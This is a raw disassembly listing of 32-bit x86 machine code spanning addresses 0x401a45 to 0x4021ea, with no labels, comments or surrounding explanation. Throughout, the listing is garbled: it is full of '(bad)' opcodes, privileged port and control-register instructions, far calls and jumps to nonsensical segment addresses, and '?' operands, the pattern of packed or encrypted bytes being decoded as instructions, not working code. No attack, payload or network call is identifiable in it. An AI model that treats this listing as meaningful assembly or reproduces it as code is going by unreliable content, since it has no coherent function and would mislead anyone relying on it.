  401a45:	or     BYTE PTR [edx-0x4e],al
  401a48:	mov    dh,0xb4
  401a4a:	xchg   ebx,eax
  401a4b:	jecxz  0x401a2b
  401a4d:	repz mov edx,0x59df3570
  401a53:	mov    eax,ds:0xcb20bd65
  401a58:	push   ecx
  401a59:	dec    esp
  401a5a:	xor    bl,bh
  401a5c:	daa    
  401a5d:	push   ebp
  401a5e:	xchg   DWORD PTR [ebp-0x70e4dea2],ebx
  401a64:	push   edx
  401a65:	sahf   
  401a66:	out    dx,eax
  401a67:	cwde   
  401a68:	outs   dx,DWORD PTR ds:[esi]
  401a69:	sbb    BYTE PTR [eax-0x44b5a89f],dh
  401a6f:	fisttp DWORD PTR [esi+0x6e14cdbc]
  401a75:	enter  0xdbef,0x5f
  401a79:	sbb    eax,0xbad22152
  401a7e:	call   0x64ec:0xd374f1ac
  401a85:	mov    dh,BYTE PTR [edx-0x1247e748]
  401a8b:	(bad)  
  401a8c:	pop    ecx
  401a8d:	xchg   DWORD PTR [ecx+0x5b],eax
  401a90:	pop    ebp
  401a91:	fxch   st(1)
  401a93:	ins    DWORD PTR es:[edi],dx
  401a94:	mov    ebx,DWORD PTR [edi+0x51]
  401a97:	mov    ebp,DWORD PTR [eax+0x64]
  401a9a:	dec    edx
  401a9b:	sbb    DWORD PTR [esi-0x56],0x42
  401a9f:	imul   ecx,DWORD PTR [esi-0x62],0x4312f18c
  401aa6:	(bad)  
  401aa7:	(bad)  
  401aa8:	xor    al,0xdc
  401aaa:	(bad)  
  401aab:	mov    bh,0x93
  401aad:	mov    dl,0x5b
  401aaf:	inc    esp
  401ab0:	jge    0x401a6f
  401ab2:	mov    BYTE PTR [edx],cl
  401ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab5:	inc    ebx
  401ab6:	mov    dl,0x93
  401ab8:	pop    ebp
  401ab9:	sbb    ebx,DWORD PTR [ecx+0x7fa7f82c]
  401abf:	lds    esp,FWORD PTR [edx-0x70]
  401ac2:	mov    al,0xe2
  401ac4:	shr    DWORD PTR [esi-0x22a7b1b0],1
  401aca:	mov    ecx,0x8f00eed1
  401acf:	lock sahf 
  401ad1:	jne    0x401b2e
  401ad3:	lea    ebx,[esi-0x19]
  401ad6:	int3   
  401ad7:	mov    edx,0x7b864856
  401adc:	pop    ecx
  401add:	pusha  
  401ade:	sub    DWORD PTR [eax],esi
  401ae0:	shr    DWORD PTR [eax],cl
  401ae2:	dec    ecx
  401ae3:	and    ebp,DWORD PTR [ebx-0x15]
  401ae6:	retf   
  401ae7:	jno    0x401b08
  401ae9:	sahf   
  401aea:	dec    ebp
  401aeb:	into   
  401aec:	stos   DWORD PTR es:[edi],eax
  401aed:	or     edi,DWORD PTR [ebp-0x6e]
  401af0:	add    cl,BYTE PTR [edx-0x617f10c7]
  401af6:	dec    ebx
  401af7:	jmp    0x401ac8
  401af9:	(bad)  
  401afa:	cmp    bh,al
  401afc:	jecxz  0x401b45
  401afe:	mov    WORD PTR [eax+0x391eb294],?
  401b04:	stc    
  401b05:	dec    edi
  401b06:	dec    ecx
  401b07:	nop
  401b08:	xor    ecx,eax
  401b0a:	pop    edi
  401b0b:	aad    0xc
  401b0d:	sbb    esp,DWORD PTR [ecx-0x3e]
  401b10:	mov    eax,0x125df0dd
  401b15:	imul   BYTE PTR ds:0x8bed2de7
  401b1b:	sbb    DWORD PTR [ebp+0x614f52da],edx
  401b21:	adc    BYTE PTR [edi-0x559df4b8],al
  401b27:	fwait
  401b28:	mov    gs,WORD PTR [esi+0x7]
  401b2b:	and    al,0x30
  401b2d:	mov    ebx,0x93b0069
  401b32:	xchg   ecx,eax
  401b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b34:	dec    edx
  401b35:	inc    BYTE PTR [edx-0x14]
  401b38:	mov    ebp,0xc179da33
  401b3d:	jp     0x401aee
  401b3f:	loop   0x401b08
  401b41:	dec    ecx
  401b42:	ins    DWORD PTR es:[edi],dx
  401b43:	push   0x12
  401b45:	fidivr DWORD PTR [ebx]
  401b47:	dec    esi
  401b48:	push   cs
  401b49:	and    dl,BYTE PTR [ebx]
  401b4b:	inc    edi
  401b4c:	pop    esp
  401b4d:	fs sub al,0x92
  401b50:	dec    ebx
  401b51:	std    
  401b52:	mov    esp,0x993b3393
  401b57:	into   
  401b58:	pop    eax
  401b59:	xchg   edi,eax
  401b5a:	and    ah,BYTE PTR [ebp*8+0x54676b4b]
  401b61:	mov    bh,0x32
  401b63:	adc    bl,BYTE PTR [edi]
  401b65:	push   ebp
  401b66:	or     eax,ecx
  401b68:	test   esp,ebx
  401b6a:	pusha  
  401b6b:	mov    ch,BYTE PTR [edi]
  401b6d:	loope  0x401b3f
  401b6f:	mov    dl,0x4a
  401b71:	mov    ds:0x96a7f744,al
  401b76:	lock jno 0x401b6b
  401b79:	jecxz  0x401b57
  401b7b:	outs   dx,DWORD PTR ds:[esi]
  401b7c:	sub    eax,0x9d5ab63b
  401b81:	adc    DWORD PTR [edx],ebp
  401b83:	push   0xffffffc1
  401b85:	inc    edi
  401b86:	cdq    
  401b87:	mov    edi,0xf87d63b
  401b8c:	loop   0x401b12
  401b8e:	jae    0x401bfe
  401b90:	std    
  401b91:	mov    eax,ds:0xad5b5a79
  401b96:	push   edi
  401b97:	imul   BYTE PTR [ecx+0x14]
  401b9a:	cmp    al,0x6b
  401b9c:	fsubr  DWORD PTR [edi+0x45]
  401b9f:	retfw  
  401ba1:	push   0xffffffd1
  401ba3:	int    0xdd
  401ba5:	mov    dh,0xaf
  401ba7:	and    al,0xf
  401ba9:	pop    esi
  401baa:	mov    esi,0xd51690a1
  401baf:	test   al,0x71
  401bb1:	je     0x401bad
  401bb3:	lods   al,BYTE PTR ds:[esi]
  401bb4:	scas   eax,DWORD PTR es:[edi]
  401bb5:	icebp  
  401bb6:	ins    DWORD PTR es:[edi],dx
  401bb7:	xor    dl,BYTE PTR [edi]
  401bb9:	lahf   
  401bba:	adc    DWORD PTR [edi],edx
  401bbc:	xchg   cl,al
  401bbe:	cli    
  401bbf:	cmp    BYTE PTR ds:0x4a56a9da,al
  401bc5:	das    
  401bc6:	mov    esp,0xfdc5d876
  401bcb:	xlat   BYTE PTR ds:[ebx]
  401bcc:	mov    cl,0x41
  401bce:	mov    WORD PTR [ebp-0x36],fs
  401bd1:	cs pop esp
  401bd3:	sbb    al,0xaf
  401bd5:	mov    ebp,0xa66853f0
  401bda:	cmp    eax,0xb3e16941
  401bdf:	fwait
  401be0:	xor    eax,0x49f87fc
  401be5:	mov    ecx,DWORD PTR [esi-0x5c2509ae]
  401beb:	xchg   ebx,eax
  401bec:	xchg   ebp,eax
  401bed:	jle    0x401c4a
  401bef:	xor    ebx,ecx
  401bf1:	popf   
  401bf2:	mov    ebp,0x40ad0ce1
  401bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf8:	or     cl,BYTE PTR [ebx-0x3a03a7ce]
  401bfe:	add    eax,DWORD PTR [ebp-0x6c4a43da]
  401c04:	dec    eax
  401c05:	xchg   edx,eax
  401c06:	cld    
  401c07:	sbb    ebx,eax
  401c09:	out    0xa4,al
  401c0b:	clc    
  401c0c:	ret    
  401c0d:	mov    ch,0x43
  401c0f:	je     0x401ba9
  401c11:	jnp    0x401c1e
  401c13:	ins    BYTE PTR es:[edi],dx
  401c14:	pop    esi
  401c15:	mov    ds:0x3e09f56e,eax
  401c1a:	ds xor al,0x7d
  401c1d:	mov    eax,fs:0x789ffcdc
  401c23:	fs (bad) 
  401c25:	mov    bl,0xf2
  401c27:	leave  
  401c28:	iret   
  401c29:	pop    edx
  401c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c2b:	and    dl,BYTE PTR [ebp-0x7e]
  401c2e:	sub    ch,BYTE PTR [esi-0x3b28562d]
  401c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c35:	ret    
  401c36:	shl    BYTE PTR [ebx],1
  401c38:	jecxz  0x401c9b
  401c3a:	add    al,0x4f
  401c3c:	std    
  401c3d:	jge    0x401c99
  401c3f:	push   eax
  401c40:	pop    esp
  401c41:	inc    eax
  401c42:	push   ss
  401c43:	sub    bh,BYTE PTR [esi]
  401c45:	fild   WORD PTR [edx+0x737a28e1]
  401c4b:	mov    ds,WORD PTR [ecx]
  401c4d:	retf   
  401c4e:	mov    bl,0x45
  401c50:	mov    eax,ds:0x2fe64edf
  401c55:	ins    DWORD PTR es:[edi],dx
  401c56:	sub    al,0xc2
  401c58:	pop    edx
  401c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c5a:	fcom   DWORD PTR [edi+0x66]
  401c5d:	test   edx,eax
  401c5f:	lahf   
  401c60:	shl    BYTE PTR [esi],cl
  401c62:	adc    esi,DWORD PTR [eax+esi*4-0x6c]
  401c66:	adc    al,0xb8
  401c68:	xchg   edi,eax
  401c69:	inc    ecx
  401c6a:	xor    dl,ah
  401c6c:	sub    eax,0x34e5a89a
  401c71:	fldcw  WORD PTR ds:0x38dab22d
  401c77:	stos   BYTE PTR es:[edi],al
  401c78:	mov    WORD PTR [edi],ds
  401c7a:	inc    ebp
  401c7b:	xchg   BYTE PTR ds:0xab3e29f1,al
  401c81:	aad    0x50
  401c83:	enter  0xf4cf,0x2e
  401c87:	call   0xdd4d:0xf49a36c7
  401c8e:	(bad)  [esi+0x22]
  401c91:	out    0x6,eax
  401c93:	cmp    ch,cl
  401c95:	imul   ebx,edi,0xd
  401c98:	rcl    DWORD PTR [ecx-0x63],1
  401c9b:	inc    ebx
  401c9c:	mov    al,ds:0x910cc881
  401ca1:	adc    bh,BYTE PTR [ebp+eiz*4+0x74]
  401ca5:	(bad)  
  401ca6:	xor    eax,0xf09c49ea
  401cab:	dec    ecx
  401cac:	mov    edi,cr0
  401caf:	xor    BYTE PTR [ebp+0x6bf1172b],dl
  401cb5:	(bad)  
  401cb6:	cli    
  401cb7:	sbb    DWORD PTR [edi-0x7c3e0e28],ebp
  401cbd:	jmp    DWORD PTR ds:0xa3468444
  401cc3:	rcl    DWORD PTR ds:0x17f6463e,0x57
  401cca:	(bad)  
  401ccb:	retf   
  401ccc:	stc    
  401ccd:	ds test eax,0xae18f056
  401cd3:	fldenv [ebx+0x79]
  401cd6:	(bad)  
  401cd7:	jns    0x401cab
  401cd9:	mov    ecx,0xda9074b1
  401cde:	pushf  
  401cdf:	mov    ebp,0xb5dcb0af
  401ce4:	enter  0x76e6,0x4c
  401ce8:	scas   eax,DWORD PTR es:[edi]
  401ce9:	fwait
  401cea:	xchg   ecx,eax
  401ceb:	int3   
  401cec:	xchg   ebp,eax
  401ced:	(bad)
  401cf0:	outs   dx,BYTE PTR ds:[esi]
  401cf1:	add    al,0x5d
  401cf3:	(bad)  
  401cf4:	cmp    DWORD PTR [esp+edx*1-0x1f2c2f70],ebp
  401cfb:	adc    BYTE PTR [eax-0x1ace8289],0x2
  401d02:	loopne 0x401d37
  401d04:	mov    edx,0xab3c77b4
  401d09:	call   0x7298:0xe5370413
  401d10:	mov    ds:0x265008f1,eax
  401d15:	pop    ds
  401d16:	in     eax,dx
  401d17:	mov    edi,0xfab8d839
  401d1c:	mov    edx,0x3a05739f
  401d21:	mov    WORD PTR [ebx-0x3c90db9b],?
  401d27:	jnp    0x401d82
  401d29:	lea    ebp,[eax]
  401d2b:	sub    BYTE PTR [edx],dl
  401d2d:	inc    eax
  401d2e:	es xor BYTE PTR cs:[edi],ch
  401d32:	stos   BYTE PTR es:[edi],al
  401d33:	div    DWORD PTR [esi+ebx*1]
  401d36:	push   ss
  401d37:	dec    edx
  401d38:	test   al,0xa7
  401d3a:	dec    eax
  401d3b:	sub    DWORD PTR [esi+0x67],ebp
  401d3e:	test   al,0xb2
  401d40:	popf   
  401d41:	pusha  
  401d42:	int    0x89
  401d44:	and    esp,ebx
  401d46:	jl     0x401cec
  401d48:	or     ch,BYTE PTR [ebx+0x23]
  401d4b:	lahf   
  401d4c:	out    0x20,eax
  401d4e:	xor    ebx,DWORD PTR [edx-0x79124e19]
  401d54:	jno    0x401d02
  401d56:	out    dx,al
  401d57:	int    0x59
  401d59:	jnp    0x401d58
  401d5b:	sub    eax,esi
  401d5d:	test   al,0x88
  401d5f:	(bad)  
  401d60:	div    DWORD PTR ds:0xae7c48a
  401d66:	or     esp,ecx
  401d68:	stos   DWORD PTR es:[edi],eax
  401d69:	jb     0x401da7
  401d6b:	icebp  
  401d6c:	fisubr WORD PTR [esi-0x7d]
  401d6f:	mov    edi,0xcad71e14
  401d74:	dec    ebx
  401d75:	aaa    
  401d76:	popa   
  401d77:	(bad)  
  401d78:	stc    
  401d79:	mov    ecx,0xaf68ba4d
  401d7e:	addr16 xchg edx,eax
  401d80:	popa   
  401d81:	mov    edx,0xdf354839
  401d86:	outs   dx,DWORD PTR ds:[esi]
  401d87:	jmp    0x97b89faf
  401d8c:	daa    
  401d8d:	jl     0x401db8
  401d8f:	add    bl,BYTE PTR [ebx+0x5d]
  401d92:	lds    ecx,FWORD PTR [edi-0x7349aee7]
  401d98:	sub    eax,0x8abe8284
  401d9d:	lea    ecx,[ebx-0x30]
  401da0:	stos   DWORD PTR es:[edi],eax
  401da1:	jb     0x401dd8
  401da3:	rcl    BYTE PTR [ebp-0x64],0x3e
  401da7:	inc    eax
  401da8:	jmp    0xd078f6a7
  401dad:	hlt    
  401dae:	imul   esp,DWORD PTR [esi+0x7d],0xeb55aa86
  401db5:	pop    esp
  401db6:	loope  0x401d4d
  401db8:	pop    ebx
  401db9:	inc    eax
  401dba:	retf   0xee5f
  401dbd:	push   ecx
  401dbe:	fisttp WORD PTR [edx-0x24]
  401dc1:	adc    edi,ebx
  401dc3:	dec    edi
  401dc4:	sti    
  401dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dc6:	icebp  
  401dc7:	out    0x52,al
  401dc9:	leave  
  401dca:	sbb    ebx,ebx
  401dcc:	hlt    
  401dcd:	xor    DWORD PTR [edx],0x2f2a2be8
  401dd3:	push   es
  401dd4:	shl    DWORD PTR [esp+edi*1-0x37],cl
  401dd8:	ret    0x3aea
  401ddb:	jne    0x401de6
  401ddd:	(bad)  
  401dde:	enter  0x7855,0x88
  401de2:	xchg   ecx,eax
  401de3:	sbb    DWORD PTR [ecx+0x3af63c5e],0x26abaebd
  401ded:	add    eax,0xf5e26ba9
  401df2:	mov    ds:0x1dfca703,eax
  401df7:	aam    0x7e
  401df9:	data16 (bad) 
  401dfb:	xchg   ebx,eax
  401dfc:	js     0x401df0
  401dfe:	jecxz  0x401de5
  401e00:	push   edx
  401e01:	les    ebp,FWORD PTR [edi+0x3f]
  401e04:	jo     0x401e0e
  401e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e07:	out    0x46,eax
  401e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e0a:	xor    DWORD PTR [esi-0x29],edi
  401e0d:	jle    0x401e15
  401e0f:	test   eax,0xf13079f2
  401e14:	sub    BYTE PTR [edi],0x82
  401e17:	mov    ds:0x8f0ec323,al
  401e1c:	push   eax
  401e1d:	and    ebx,DWORD PTR [edx+0x2a]
  401e20:	call   0x233b76e7
  401e25:	and    DWORD PTR [edi+edi*2],0xffffff8c
  401e29:	out    0xc4,eax
  401e2b:	icebp  
  401e2c:	mov    edi,0xd2c6e95a
  401e31:	into   
  401e32:	popa   
  401e33:	push   edx
  401e34:	mov    BYTE PTR [ecx],cl
  401e36:	jb     0x401dda
  401e38:	sar    DWORD PTR [ebx+eax*4],cl
  401e3b:	xlat   BYTE PTR ds:[ebx]
  401e3c:	and    al,0xdd
  401e3e:	or     BYTE PTR [ecx+0x30a8bc98],al
  401e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e45:	push   0xcbafd68
  401e4a:	scas   eax,DWORD PTR es:[edi]
  401e4b:	jmp    0xc53c:0xffa1f4aa
  401e52:	jae    0x401ebe
  401e54:	cld    
  401e55:	lahf   
  401e56:	retf   
  401e57:	clc    
  401e58:	ins    BYTE PTR es:[edi],dx
  401e59:	cmp    eax,0xeacad0a2
  401e5e:	push   edi
  401e5f:	dec    eax
  401e60:	pop    eax
  401e61:	jb     0x401ec3
  401e63:	mov    al,BYTE PTR [ebx+0x11]
  401e66:	mov    ch,ah
  401e68:	mov    dl,0x6f
  401e6a:	xchg   ecx,ecx
  401e6c:	in     eax,0x2b
  401e6e:	cmp    DWORD PTR [eax+0x57d29477],edx
  401e74:	sahf   
  401e75:	mov    ss,WORD PTR [edx+ebp*2]
  401e78:	mov    ?,WORD PTR [ecx-0xe]
  401e7b:	dec    esi
  401e7c:	jmp    0x842b:0x990d413c
  401e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e84:	into   
  401e85:	mov    cl,0xdd
  401e87:	lock call 0x39c486d6
  401e8d:	rcl    edx,0xa8
  401e90:	mov    al,ds:0xf93bf470
  401e95:	mov    WORD PTR [edx],?
  401e97:	sbb    al,0xa2
  401e99:	mov    eax,DWORD PTR [ebx+0x64]
  401e9c:	xchg   esp,eax
  401e9d:	cld    
  401e9e:	mov    esi,0x82e7af8b
  401ea3:	sbb    bh,BYTE PTR [ecx]
  401ea5:	jae    0x401e65
  401ea7:	xchg   esp,eax
  401ea8:	pop    esi
  401ea9:	stc    
  401eaa:	and    edx,DWORD PTR [esp+ecx*4-0x7bdf72bc]
  401eb1:	sahf   
  401eb2:	xchg   edi,eax
  401eb3:	out    dx,eax
  401eb4:	add    ecx,DWORD PTR [edx]
  401eb6:	mov    ds:0xe236e7c0,eax
  401ebb:	mov    dh,0x54
  401ebd:	xor    DWORD PTR [ebx+0x3d45c923],esi
  401ec3:	mov    al,ds:0x8a96a94e
  401ec8:	pop    esp
  401ec9:	shr    DWORD PTR [ecx],cl
  401ecb:	cli    
  401ecc:	jne    0x401e77
  401ece:	imul   eax,DWORD PTR [ecx-0x53],0xd9eee6e8
  401ed5:	pop    ebp
  401ed6:	jnp    0x401e7e
  401ed8:	xor    eax,0xc01d44f9
  401edd:	fwait
  401ede:	pop    ecx
  401edf:	jmp    0xa235:0x6e3314f8
  401ee6:	fistp  DWORD PTR [edx+eax*8+0x59]
  401eea:	lock add ecx,edx
  401eed:	dec    esi
  401eee:	pop    es
  401eef:	push   edx
  401ef0:	adc    al,BYTE PTR [ecx+0x41a15e05]
  401ef6:	dec    esp
  401ef7:	cmp    bh,bh
  401ef9:	in     eax,0xb2
  401efb:	shl    DWORD PTR [eax],0xb6
  401efe:	(bad)  
  401eff:	mov    al,ds:0x3c2eb920
  401f04:	xlat   BYTE PTR ds:[ebx]
  401f05:	inc    edi
  401f06:	dec    edi
  401f07:	adc    al,0xe7
  401f09:	sahf   
  401f0a:	jle    0x401f22
  401f0c:	sub    ch,BYTE PTR [ecx-0x7a]
  401f0f:	cmp    ebx,edi
  401f11:	ror    al,0xa5
  401f14:	mov    edi,DWORD PTR [eax+0x3083e768]
  401f1a:	(bad)  
  401f1b:	(bad)  
  401f1c:	cmp    DWORD PTR [edi-0x5036746c],edi
  401f22:	adc    esi,DWORD PTR [eax+0x7d]
  401f25:	dec    esi
  401f26:	call   0xa3c861f8
  401f2b:	lods   al,BYTE PTR ds:[esi]
  401f2c:	ret    0x5ec2
  401f2f:	inc    esi
  401f30:	lea    edx,[eax+esi*1]
  401f33:	pop    esp
  401f34:	xor    BYTE PTR [eax-0x70],ch
  401f37:	lahf   
  401f38:	inc    eax
  401f39:	cdq    
  401f3a:	sub    cl,ch
  401f3c:	push   0xe76be9b8
  401f41:	xchg   ebp,eax
  401f42:	xlat   BYTE PTR cs:[ebx]
  401f44:	inc    ecx
  401f45:	add    ebx,DWORD PTR [ebx-0x4c]
  401f48:	es js  0x401fa6
  401f4b:	cmp    eax,0x6c3e481
  401f50:	push   ss
  401f51:	inc    esi
  401f52:	dec    edx
  401f53:	pusha  
  401f54:	in     al,dx
  401f55:	lock gs pop edx
  401f58:	in     eax,0x31
  401f5a:	ret    
  401f5b:	(bad)  
  401f5c:	xor    al,0xe7
  401f5e:	in     eax,0x6c
  401f60:	dec    edi
  401f61:	xchg   ebp,eax
  401f62:	fstp   QWORD PTR [edi-0x60b96aab]
  401f68:	fwait
  401f69:	cwde   
  401f6a:	sbb    esp,DWORD PTR cs:[ecx+0x5b]
  401f6e:	fcom   st(7)
  401f70:	in     eax,dx
  401f71:	pop    edi
  401f72:	dec    esi
  401f73:	(bad)  
  401f74:	out    dx,al
  401f75:	push   0x8cd07ef0
  401f7a:	enter  0x2bc9,0x81
  401f7e:	mov    ?,WORD PTR es:[ebx+0x6d67a96c]
  401f85:	pop    ebp
  401f86:	mov    ah,0xd6
  401f88:	ins    DWORD PTR es:[edi],dx
  401f89:	adc    al,0xfe
  401f8b:	xor    BYTE PTR [edx+0x6],0xe6
  401f8f:	loopne 0x401f23
  401f91:	call   0x26c1:0x9f253deb
  401f98:	and    bl,BYTE PTR [ebx+0x5a]
  401f9b:	fsub   QWORD PTR [edx+edx*1+0x2d5fe0aa]
  401fa2:	test   BYTE PTR [edx+eax*1+0x761da192],bl
  401fa9:	aas    
  401faa:	pop    ecx
  401fab:	and    bh,BYTE PTR [edi]
  401fad:	jge    0x401fb1
  401faf:	push   0xffffffa7
  401fb1:	sub    DWORD PTR [eax-0xeb5b6da],ebx
  401fb7:	inc    esp
  401fb8:	mov    edx,0xfe2a5da9
  401fbd:	leave  
  401fbe:	ss inc eax
  401fc0:	jb     0x401f53
  401fc2:	jmp    0xa2d1:0x79b7c438
  401fc9:	xchg   ebp,esp
  401fcb:	(bad)  
  401fcc:	loop   0x401f65
  401fce:	mov    eax,0x8f2934e5
  401fd3:	pop    ecx
  401fd4:	push   0x7a
  401fd6:	pushf  
  401fd7:	xor    al,bh
  401fd9:	mov    edi,0x19e17699
  401fde:	in     eax,0x13
  401fe0:	jl     0x40205c
  401fe2:	jns    0x40205c
  401fe4:	xor    BYTE PTR [ebx],ch
  401fe6:	push   0x72
  401fe8:	sub    ecx,DWORD PTR [edi]
  401fea:	popa   
  401feb:	and    al,0xc3
  401fed:	push   ds
  401fee:	adc    eax,0x1bab9e83
  401ff3:	in     al,0xc8
  401ff5:	inc    edx
  401ff6:	adc    dl,dh
  401ff8:	call   0x5eea72eb
  401ffd:	and    eax,0x34617633
  402002:	imul   eax,DWORD PTR [ebx],0x6f
  402005:	lahf   
  402006:	and    BYTE PTR [ebp+0x90cbc66],ah
  40200c:	push   ecx
  40200d:	aam    0x40
  40200f:	or     DWORD PTR [ebx+0x78],ecx
  402012:	icebp  
  402013:	sbb    eax,0x77830263
  402018:	test   DWORD PTR [ebx+eax*2-0x75a1a0c5],0x47a46f26
  402023:	dec    eax
  402024:	inc    eax
  402025:	or     dh,cl
  402027:	rcl    WORD PTR es:[esi+ebp*4-0x4c],0x99
  40202e:	mov    ds:0x8628693d,eax
  402033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402034:	mov    ch,0xd6
  402036:	out    dx,al
  402037:	pusha  
  402038:	out    dx,al
  402039:	stc    
  40203a:	fs mov edi,ss
  40203d:	loopne 0x4020a3
  40203f:	jo     0x401fc6
  402041:	jb     0x4020c0
  402043:	jle    0x401fd3
  402045:	sub    dl,BYTE PTR [ebp-0x39]
  402048:	cdq    
  402049:	push   es
  40204a:	xchg   edi,eax
  40204b:	add    DWORD PTR [eax-0x4afe8ef6],edx
  402051:	test   eax,0x1bbebb88
  402056:	push   ecx
  402057:	mov    ds:0xe3928f7,eax
  40205c:	xchg   ecx,eax
  40205d:	in     al,dx
  40205e:	adc    al,BYTE PTR [esi-0x24d78bd3]
  402064:	inc    BYTE PTR [edx+0x23abab2b]
  40206a:	push   0x14
  40206c:	pop    ds
  40206d:	xor    al,0x66
  40206f:	fwait
  402070:	aam    0xac
  402072:	int    0x8c
  402074:	sbb    al,0x14
  402076:	dec    esp
  402077:	push   cs
  402078:	rcl    eax,1
  40207a:	xor    eax,0x99207528
  40207f:	sub    al,bl
  402081:	push   ds
  402082:	int    0x40
  402084:	retf   0x6c26
  402087:	test   eax,0xf373ed64
  40208c:	out    0x4b,eax
  40208e:	mov    ch,0x42
  402090:	stos   DWORD PTR es:[edi],eax
  402091:	int3   
  402092:	sub    dl,al
  402094:	loope  0x4020c5
  402096:	xor    BYTE PTR [esi+0x7e],bl
  402099:	sbb    DWORD PTR [eax],ecx
  40209b:	jae    0x40208d
  40209d:	sub    al,0x87
  40209f:	ss push ss
  4020a1:	mov    BYTE PTR [esi-0x3c773f60],dl
  4020a7:	inc    edx
  4020a8:	push   0xfe9a008e
  4020ad:	jp     0x40210b
  4020af:	cwde   
  4020b0:	push   ebp
  4020b1:	jae    0x4020c9
  4020b3:	inc    edi
  4020b4:	retf   0x41c
  4020b7:	mov    bh,0xe
  4020b9:	repz std 
  4020bb:	adc    eax,0xdf0ff84f
  4020c0:	ja     0x4020ba
  4020c2:	iret   
  4020c3:	sub    DWORD PTR [ecx-0x4fc2b298],eax
  4020c9:	in     eax,dx
  4020ca:	jecxz  0x40206d
  4020cc:	mov    bl,BYTE PTR [edi]
  4020ce:	aaa    
  4020cf:	in     al,dx
  4020d0:	idiv   BYTE PTR [esi+ebx*1]
  4020d3:	adc    BYTE PTR [ecx+0x26],ch
  4020d6:	push   ecx
  4020d7:	cdq    
  4020d8:	sbb    al,0x90
  4020da:	jecxz  0x40209d
  4020dc:	call   0xae32529a
  4020e1:	test   al,0x39
  4020e3:	fdiv   st,st(1)
  4020e5:	pop    eax
  4020e6:	and    eax,0x58e202f6
  4020eb:	mov    al,bh
  4020ed:	sub    eax,DWORD PTR [esi]
  4020ef:	test   DWORD PTR [ebx+esi*8],0x5dda7dd6
  4020f6:	add    BYTE PTR [eax+0x2b0e5f10],ch
  4020fc:	lahf   
  4020fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020fe:	fdivr  QWORD PTR [eax]
  402100:	jns    0x40210e
  402102:	and    ebx,DWORD PTR [esi-0x72067cd7]
  402108:	sbb    eax,0x12cdef37
  40210d:	mov    bh,BYTE PTR [edx]
  40210f:	outs   dx,DWORD PTR ds:[esi]
  402110:	inc    edi
  402111:	pop    ss
  402112:	arpl   WORD PTR [edi+edi*2+0x6945cd07],sp
  402119:	add    esi,DWORD PTR [eax+0x3b4b8bc7]
  40211f:	ja     0x402145
  402121:	(bad)  
  402122:	iret   
  402123:	dec    edi
  402124:	sub    al,0x69
  402126:	scas   eax,DWORD PTR es:[edi]
  402127:	(bad)  
  402128:	sbb    bl,BYTE PTR [esi+0x64]
  40212b:	add    ax,0x45da
  40212f:	pop    ds
  402130:	push   ss
  402131:	aas    
  402132:	push   ebx
  402133:	dec    esi
  402134:	adc    bl,cl
  402136:	in     eax,dx
  402137:	sub    eax,0x48153996
  40213c:	pop    esi
  40213d:	add    al,0xd7
  40213f:	push   eax
  402140:	imul   ebx,DWORD PTR [ecx],0x18
  402143:	gs pop eax
  402145:	ficomp DWORD PTR [edx]
  402147:	jne    0x4020ce
  402149:	clc    
  40214a:	jp     0x402154
  40214c:	lea    esi,[ebx+0x44]
  40214f:	aas    
  402150:	and    ebx,DWORD PTR [esp-0x10d89c95]
  402157:	(bad)  
  402158:	fadd   DWORD PTR [edx-0x60]
  40215b:	lahf   
  40215c:	pop    esi
  40215d:	push   edi
  40215e:	(bad)  
  40215f:	jge    0x4021aa
  402161:	jne    0x402149
  402163:	push   esi
  402164:	not    BYTE PTR es:0x3af4c8ff
  40216b:	nop
  40216c:	cmc    
  40216d:	jg     0x40211b
  40216f:	jge    0x40219f
  402171:	hlt    
  402172:	jmp    0xb9f3:0xd2b8a9e1
  402179:	das    
  40217a:	rcr    DWORD PTR [edi+ebp*8+0x7a],0xeb
  40217f:	cwde   
  402180:	push   ebx
  402181:	pop    ss
  402182:	jp     0x4021c0
  402184:	lods   eax,DWORD PTR ds:[esi]
  402185:	out    0x78,al
  402187:	stos   BYTE PTR es:[edi],al
  402188:	call   0x47549efe
  40218d:	dec    eax
  40218e:	out    0x9e,eax
  402190:	dec    esp
  402191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402192:	cmp    BYTE PTR [esi+0x383c584d],bl
  402198:	mov    ah,0x52
  40219a:	mov    es,esi
  40219c:	cmp    BYTE PTR [esi],cl
  40219e:	add    eax,0x69087a79
  4021a3:	(bad)  
  4021a5:	inc    ebp
  4021a6:	(bad)  
  4021a7:	rol    ebp,1
  4021a9:	outs   dx,BYTE PTR ds:[esi]
  4021aa:	sbb    al,bl
  4021ac:	sar    DWORD PTR [ecx],cl
  4021ae:	(bad)  
  4021af:	ins    BYTE PTR es:[edi],dx
  4021b0:	test   al,0x3c
  4021b2:	mov    al,0xfe
  4021b4:	out    0xe4,eax
  4021b6:	ja     0x4021aa
  4021b8:	sbb    BYTE PTR [ebp+0x3f443ba1],al
  4021be:	cmc    
  4021bf:	mov    ecx,0x7071c5ae
  4021c4:	loope  0x40217b
  4021c6:	xchg   ebp,eax
  4021c7:	xchg   ebx,eax
  4021c8:	out    dx,eax
  4021c9:	mov    eax,0xe456ab83
  4021ce:	add    BYTE PTR [edi],cl
  4021d0:	fs inc ecx
  4021d2:	ror    DWORD PTR [ecx],1
  4021d4:	pop    ecx
  4021d5:	xor    ah,BYTE PTR ds:0x1f970b6d
  4021db:	push   edi
  4021dc:	cdq    
  4021dd:	sbb    BYTE PTR [ecx+0x1a],al
  4021e0:	xchg   ebx,esp
  4021e2:	inc    esp
  4021e3:	(bad)  
  4021e4:	push   cs
  4021e5:	push   cs
  4021e6:	je     0x402228
  4021e8:	leave  
  4021e9:	push   esp
  4021ea:	mov    ?,WORD PTR [edi+0x32b2936d]
